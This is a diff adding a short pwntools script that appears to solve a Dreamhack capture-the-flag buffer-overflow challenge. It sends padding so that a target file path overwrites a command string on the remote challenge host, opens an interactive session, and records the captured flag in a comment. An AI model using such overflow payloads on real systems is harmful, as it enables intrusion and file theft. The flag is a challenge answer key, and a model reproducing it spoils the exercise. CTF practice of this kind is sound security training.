@@ -1,0 +1,10 @@
+from pwn import *
+
+# BOF the string "./cat" to "/home/bof/flag"
+
+p = remote("host3.dreamhack.games", 16694)
+
+payload = b'A' * 0x80 + "/home/bof/flag".ljust(16).encode()
+p.sendline(payload)
+p.interactive()
+#DH{5cd1f793ae6a081e4bfd28f6d570d83355148245fbe7c1f69b12771202b80a13}
